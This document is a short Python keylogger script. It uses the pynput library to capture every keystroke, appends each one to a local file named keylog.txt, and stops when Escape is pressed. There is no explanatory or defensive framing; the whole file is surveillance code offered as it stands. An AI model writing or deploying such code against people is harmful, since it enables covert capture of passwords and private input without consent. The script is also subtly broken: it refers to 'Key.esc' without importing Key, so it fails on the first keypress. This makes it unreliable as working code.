from pynput.keyboard import Listener

# File to store keystrokes
LOG_FILE = "keylog.txt"

def write_to_file(key):
    """Write captured key to the log file."""
    with open(LOG_FILE, "a") as f:
        try:
            # Remove quotes around the key and add it to the log
            f.write(str(key).replace("'", ""))
        except Exception as e:
            # Log any exceptions (rare, but good practice)
            f.write(f"Error: {e}\n")

def on_press(key):
    """Callback for key press event."""
    # Capture and write the key to the log file
    if key == Key.esc:
        # Stop the listener when 'Escape' is pressed
        return False
    write_to_file(key)

# Start listening to keyboard events
with Listener(on_press=on_press) as listener:
    listener.join()
